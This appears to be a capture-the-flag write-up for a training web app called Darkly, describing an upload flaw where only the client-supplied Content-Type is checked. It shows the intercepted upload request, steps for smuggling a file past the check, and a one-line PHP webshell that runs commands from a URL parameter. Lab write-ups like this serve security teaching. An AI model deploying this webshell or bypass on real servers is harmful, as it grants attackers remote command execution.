# Reliance on File Name or Extension of Externally-Supplied File

## Description

This vulnerability occurs when a web application relies solely on the file name or extension to determine the file's type and how it should be processed. Attackers can exploit this to upload malicious files that bypass security measures, leading to code execution or other harmful actions.

### Evidence of Vulnerability

The `Darkly` application allows users to upload files through the "Add an Image" feature. Upon inspecting the upload request, the application accepts a JPEG file with the following request:
```bash
POST /index.php?page=upload HTTP/1.1
Host: darkly
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOV2Ry4ckO23ApHOU
Content-Disposition: form-data; name="uploaded"; filename="img.jpeg"
Content-Type: image/jpeg
```
The application only checks the Content-Type provided by the client. This can be bypassed by modifying the Content-Type field in the request to trick the server into accepting non-image files.

### Exploitation Steps
1. Upload a valid JPEG file (e.g., img.jpeg) and intercept the request.
2. Replace the file with a malicious PHP webshell and change the Content-Type to image/jpeg.
3. Submit the modified request.
4. Access the uploaded file to execute commands on the server.
```php
<?php
  system($_GET['cmd']);
?>
```
